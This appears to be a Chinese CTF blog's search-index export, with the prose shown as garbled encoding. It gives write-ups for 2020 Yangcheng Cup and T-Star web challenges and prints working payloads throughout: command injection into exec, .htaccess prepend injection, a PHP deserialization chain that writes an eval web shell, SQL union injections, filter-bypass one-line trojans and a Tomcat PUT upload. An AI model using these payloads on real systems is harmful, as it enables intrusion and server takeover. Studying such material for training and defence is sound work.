<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020å¹´ã€Œç¾ŠåŸæ¯ã€ç½‘ç»œå®‰å…¨å¤§èµ›</title>
    <url>/2020/09/11/2020%E5%B9%B4%E3%80%8C%E7%BE%8A%E5%9F%8E%E6%9D%AF%E3%80%8D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h1><p>è¿æ¥ä¸Šèšå‰‘åï¼Œå‘ç°<code>bbbbbbbbb.txt</code>æ–‡ä»¶ï¼Œbase64è§£ç ä¿å­˜ä¸ºå›¾ç‰‡å³å¯çœ‹åˆ°flagã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">r&#x27;bbbbbbbbb.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f2 = open(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">flag = (base64.b64decode(s))</span><br><span class="line">f2.write(flag)</span><br><span class="line">f2.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h1 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h1><p>æºç åœ¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">view-source:http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/Hei_Mao_Jing_Chang.mp3</span><br></pre></td></tr></table></figure>

<p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;è°ï¼ç«Ÿæ•¢è¸©æˆ‘ä¸€åªè€³çš„å°¾å·´ï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;One-ear&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;æœ‰æ„ç„å‡†ï¼Œæ— æ„å‡»å‘ï¼Œä½ çš„æ¢¦æƒ³å°±æ˜¯ä½ è¦ç„å‡†çš„ç›®æ ‡ã€‚ç›¸ä¿¡è‡ªå·±ï¼Œä½ å°±æ˜¯é‚£é¢—å°„ä¸­é¶å¿ƒçš„å­å¼¹ã€‚&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.$_POST[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>åŸé¢˜åœ¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://neversecure.ca/category/bug-hunting/</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/</span><br><span class="line"><span class="comment">#postæäº¤</span></span><br><span class="line">Black-Cat-Sheriff=<span class="number">04</span>b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear=;cat+flag.php&amp;White-cat-monitor=%<span class="number">5</span>B%<span class="number">5</span>D</span><br></pre></td></tr></table></figure>

<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ç½‘ä¸Šå¯ä»¥æ‰¾åˆ°åŸé¢˜ï¼š<code>X-NUCA&#39;2019â€”Ezphp</code></p>
<p>å‰æçŸ¥è¯†ï¼š</p>
<p><code>php.ini</code>ä¸­æœ‰ä¸¤é¡¹ï¼š</p>
<p>åœ¨æ‰€æœ‰é¡µé¢çš„é¡¶éƒ¨ä¸åº•éƒ¨requireæ–‡ä»¶</p>
<ul>
<li><p><code>auto_prepend_file</code> åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶</p>
</li>
<li><p><code>auto_append_file</code> åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶</p>
</li>
</ul>
<p>ä¾‹å¦‚ï¼š</p>
<p>å°†<code>.htaccess</code>è¿™ä¸ªæ–‡ä»¶åŒ…å«è¿›æ‰€æœ‰çš„phpé¡µé¢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯¹äº<code>stristr()</code>çš„é»‘åå•è¿‡æ»¤ç›´æ¥ç”¨åæ–œæ å³å¯ç»•è¿‡</p>
<p>å¯¹äºåé¢æ‹¼æ¥è¿›æ¥çš„<code>&quot;\nHello World&quot;</code>éœ€è¦ç”¨åæ–œæ è½¬ä¹‰</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php_value auto_prepend_fil\%0Ae .htaccess%0A%23&lt;?php system(&#x27;cat /f&#x27;.&#x27;lag&#x27;);?&gt;\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>

<h1 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h1><p>é¦–å…ˆè®¿é—®<code>robots.txt</code>ï¼Œæç¤º<code>Disallow: /star1.php/</code>ï¼Œæºä»£ç é‡Œæœ‰:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!--  å°èƒ–è¯´ç”¨ä¸ªä¸å®‰å…¨çš„åè®®ä»æˆ‘å®¶æ‰èƒ½è¿›ser.phpå‘¢ï¼  !--&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸å®‰å…¨åè®®ç”¨<code>http</code>è®¿é—®ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10024/sandbox/hrnh1cvpq4bvbm960878icaodb/star1.php?path=http://127.0.0.1/sandbox/hrnh1cvpq4bvbm960878icaodb/ser.php</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line">$flag=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $text;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;&#x27;</span>,$text=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = $file;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = $text;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $d   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        $a= $d. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,$a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾<code>file_put_contents</code>æ˜¯è¦å†™shellè¿›å»ï¼Œå¹¶ä¸”åœ¨å†…å®¹å‰åŠ äº†æ­»äº¡å‡½æ•°ï¼Œé‚æ„é€ é“¾æ¡ï¼Œè¿™é‡Œè§¦å‘<code>__toString</code>ï¼Œä½†æ˜¯æ²¡æœ‰åœ°æ–¹å¯ä»¥è§¦å‘ï¼Œç›²çŒœåº”è¯¥æ˜¯<code>echo unserialize</code>çš„ååºåˆ—å…¥å£ã€‚æ„é€ é“¾å¦‚ä¸‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$GWHT = new GWHT();</span><br><span class="line">$GWHT-&gt;hero = new Yongen();</span><br><span class="line">$GWHT-&gt;hero-&gt;file = &#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;;</span><br><span class="line">$GWHT-&gt;hero-&gt;text = &#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;;</span><br><span class="line">$a = serialize($GWHT);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10024/sandbox/hrnh1cvpq4bvbm960878icaodb/star1.php?path=http://127.0.0.1/sandbox/hrnh1cvpq4bvbm960878icaodb/ser.php&amp;c=O:4:&quot;GWHT&quot;:1:&#123;s:4:&quot;hero&quot;;O:6:&quot;Yongen&quot;:2:&#123;s:4:&quot;file&quot;;s:77:&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;;s:4:&quot;text&quot;;s:40:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿ä¸Šåœ¨æ ¹ç›®å½•<code>/ffflag</code>å³å¯è·å¾—flagã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10024</span>/sandbox/hrnh1cvpq4bvbm960878icaodb/shell.php</span><br><span class="line">cmd</span><br></pre></td></tr></table></figure>

<h1 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h1><p>é¦–å…ˆç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.quoted-printable-encode/resource=GWHT.php</span><br><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=GWHT.php</span><br></pre></td></tr></table></figure>

<p>æºç ä¸ºï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=&quot;question.jpg&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        die(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;count&quot; rows=10 cols=50&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    <span class="keyword">if</span> (isset($_GET[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        $count = $_GET[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;</span><br><span class="line">        	die(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        echo <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå¯ä»¥ç”¨å•å¼•å·åµŒå¥—åå¼•å·æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10025/?file=GWHT.php&amp;count=&#x27;`ls &gt; 1.txt`&#x27;</span><br></pre></td></tr></table></figure>

<p>å‰æçŸ¥è¯†ï¼š</p>
<p>å› ä¸ºè¿‡æ»¤äº†<code>$_POST</code>å’Œ<code>$_GET</code>ï¼Œéœ€è¦å¯ä»¥ç”¨åˆ°<code>get_defined_vars()</code>ã€‚</p>
<p>æ‰“å°ä¸€ä¸ª<code>get_defined_vars()</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">array(4) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(1) &#123; [&quot;pass&quot;]=&gt; string(4) &quot;PASS&quot; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; &#125; </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æœ€å¤–å±‚æ˜¯ä¸€ä¸ª<code>array</code>ï¼Œ<code>array</code>çš„ç¬¬ä¸€ä¸ªå€¼æ˜¯<code>_GET</code>ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å‡½æ•°å¤–å±‚åµŒå¥—ä¸¤å±‚poså°±å¯ä»¥è·å–åˆ°<code>_GET</code>çš„å€¼äº†ï¼Œä¸‹é¢å°±ç›¸å½“äºä¸€ä¸ªä¸€å¥è¯æœ¨é©¬äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval(pos(pos(get_defined_vars())));</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/?file=GWHT.php&amp;count=&#x27;`echo &quot;&lt;?=eval(pos(pos(get_defined_vars())))?&gt;&quot;&gt;1.php`&#x27;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†å†™ä¸€ä¸ª<code>post</code>çš„ğŸ</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/1.php?a=file_put_contents(&#x27;kkk.php&#x27;, base64_decode(&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;));</span><br></pre></td></tr></table></figure>

<p>åˆæˆ–è€…ç”¨<code>next</code>å¯ä»¥ç›´æ¥è¿æ¥èšå‰‘</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/?file=GWHT.php&amp;count=&#x27;`echo &quot;&lt;?=eval(pos(next(get_defined_vars())))?&gt;&quot;&gt;1.php`&#x27;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>2020è…¾è®¯çŠ€ç‰›é¸Ÿç½‘ç»œå®‰å…¨T-Staré«˜æ ¡æŒ‘æˆ˜èµ›</title>
    <url>/2020/07/02/2020%E8%85%BE%E8%AE%AF%E7%8A%80%E7%89%9B%E9%B8%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Gqå’Œhhhmå¸ˆå‚…tql</p>
<h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>è€ƒç‚¹ï¼šå‰ç«¯jséªŒè¯å›¾ç‰‡åç¼€</p>
<p>ä¸Šä¼ jpgå›¾ç‰‡åæ”¹phpåç¼€forwordï¼Œå†…å®¹æ˜¯ä¸€å¥è¯æœ¨é©¬</p>
<p>åœ¨keyç›®å½•ä¸‹æœ‰key{K735c9f0D7ddc3b9}</p>
<h2 id="æˆç»©å•"><a href="#æˆç»©å•" class="headerlink" title="æˆç»©å•"></a>æˆç»©å•</h2><p>è¾“å…¥æ¡†è¾“å…¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3,database()--</span></span><br><span class="line"><span class="string">0&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;web1&#x27;</span><span class="comment">#</span></span><br><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3,column_name from information_schema.columns where table_name=&#x27;</span>fl4g<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">0&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,flag <span class="keyword">from</span> fl4g<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="å‘½ä»¤æ‰§è¡ŒåŸºç¡€"><a href="#å‘½ä»¤æ‰§è¡ŒåŸºç¡€" class="headerlink" title="å‘½ä»¤æ‰§è¡ŒåŸºç¡€"></a>å‘½ä»¤æ‰§è¡ŒåŸºç¡€</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">baidu.com | cat  ..&#x2F;key.php</span><br></pre></td></tr></table></figure>

<h2 id="ä½ èƒ½çˆ†ç ´å—"><a href="#ä½ èƒ½çˆ†ç ´å—" class="headerlink" title="ä½ èƒ½çˆ†ç ´å—"></a>ä½ èƒ½çˆ†ç ´å—</h2><ul>
<li><p>burpsuiteçˆ†ç ´å¯†ç è´¦å·éƒ½æ˜¯adminï¼Œç™»é™†æˆåŠŸä¼šsetä¸€ä¸ªcookieï¼Œcookieæ˜¯ç”¨æˆ·åçš„base64ã€‚</p>
</li>
<li><p>payload</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-admin<span class="string">&quot;union select 1,(select group_concat(flag) from flag),3-- </span></span><br></pre></td></tr></table></figure>

<ul>
<li>base64</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LWFkbWluInVuaW9uIHNlbGVjdCAxLChzZWxlY3QgZ3JvdXBfY29uY2F0KGZsYWcpIGZyb20gZmxhZyksMy0tIA==</span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ä»¶åŒ…å«GetShell"><a href="#æ–‡ä»¶åŒ…å«GetShell" class="headerlink" title="æ–‡ä»¶åŒ…å«GetShell"></a>æ–‡ä»¶åŒ…å«GetShell</h2><p>é¦–å…ˆåœ¨<code>lfi.txt</code>è¯»åˆ°æºç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($file != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    $inc = sprintf(<span class="string">&quot;%s.php&quot;</span>, $file); // only php file can be included</span><br><span class="line">    include($inc);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ç”¨ä¼ªåè®®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><ul>
<li><p>å¯¹&lt;?ã€phpã€evalç­‰è¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿‡æ»¤æ¯”è¾ƒç®€å•ç›´æ¥æ›¿æ¢ä¸ºç©ºï¼Œç›´æ¥åŒå†™å°±èƒ½ç»•è¿‡ï¼Œevalç›´æ¥åˆ©ç”¨phpå¯¹å¤§å°å†™ä¸æ•æ„Ÿç»•è¿‡ã€‚</p>
</li>
<li><p>payload</p>
</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;php?&lt;?p&lt;?phphp EVAL($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ”¹.phtçš„åç¼€èƒ½ä¸Šä¼ ï¼Œé™åˆ¶äº†20kb-100kbçš„æ–‡ä»¶å¤§å°ï¼Œå’Œå›¾ç‰‡æ··åœ¨ä¸€èµ·ä¸Šä¼ å³å¯ï¼Œè¿ä¸Šèšå‰‘ä¹‹ååœ¨keyä¸‹å‘ç°flag{Aa3c7c37508E40B3}</p>
<h2 id="å°çŒ«å’ªè¸©ç¯æ³¡"><a href="#å°çŒ«å’ªè¸©ç¯æ³¡" class="headerlink" title="å°çŒ«å’ªè¸©ç¯æ³¡"></a>å°çŒ«å’ªè¸©ç¯æ³¡</h2><p>é¢˜ç›®ç»™hint</p>
<ul>
<li>CVE-2017-12615</li>
</ul>
<p>æŠ“åŒ…æŠŠGETæ”¹ä¸ºPUTï¼Œåé¢æ·»åŠ jspåŠ æ–œæ ä¸Šä¼ é©¬</p>
